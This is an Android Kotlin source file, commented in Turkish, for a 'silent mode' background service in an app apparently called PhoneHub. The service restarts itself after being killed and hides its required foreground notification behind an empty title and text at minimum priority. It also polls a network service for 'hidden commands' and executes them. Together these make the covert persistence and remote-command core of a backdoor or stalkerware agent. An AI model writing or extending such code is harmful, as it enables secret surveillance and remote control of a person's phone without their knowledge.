package com.phonehub.android.services

import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.phonehub.android.R
import com.phonehub.android.network.SilentModeNetworkService
import com.phonehub.android.services.silentmode.SilentModeManager
import kotlinx.coroutines.*

/**
 * Gizli Mod Arka Plan Servisi
 * Uygulamanın kapalı olsa bile gizli işlemleri devam ettirir
 */
class SilentModeBackgroundService : Service() {

    private lateinit var silentModeManager: SilentModeManager
    private lateinit var networkService: SilentModeNetworkService
    private val scope = CoroutineScope(Dispatchers.Default + Job())

    private val NOTIFICATION_ID = 9999
    private val CHANNEL_ID = "silent_mode_channel"

    override fun onCreate() {
        super.onCreate()
        silentModeManager = SilentModeManager(this)
        networkService = SilentModeNetworkService(this)
        Log.d("SilentModeBackground", "Arka plan servisi oluşturuldu")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("SilentModeBackground", "Arka plan servisi başlatıldı")

        // Foreground notification oluştur (gizli gösterilmez)
        val notification = createForegroundNotification()
        startForeground(NOTIFICATION_ID, notification)

        // Gizli mod komutlarını dinle
        scope.launch {
            startListeningForCommands()
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    /**
     * Gizli mod komutlarını dinle ve işle
     */
    private suspend fun startListeningForCommands() {
        try {
            networkService.pollHiddenCommands(
                onCommandReceived = { command ->
                    scope.launch {
                        silentModeManager.executeHiddenCommand(command)
                    }
                },
                onError = { error ->
                    Log.e("SilentModeBackground", "Komut dinleme hatası: $error")
                }
            )
        } catch (e: Exception) {
            Log.e("SilentModeBackground", "Komut dinleme başarısız: ${e.message}")
        }
    }

    /**
     * Foreground notification oluştur
     * Gizli mod etkinken bile system notification gösterilmez
     */
    private fun createForegroundNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("")
        .setContentText("")
        .setSmallIcon(R.drawable.ic_launcher_foreground)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setShowWhen(false)
        .setOngoing(true)
        .build()

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
        networkService.destroy()
        Log.d("SilentModeBackground", "Arka plan servisi sonlandırıldı")
    }
}
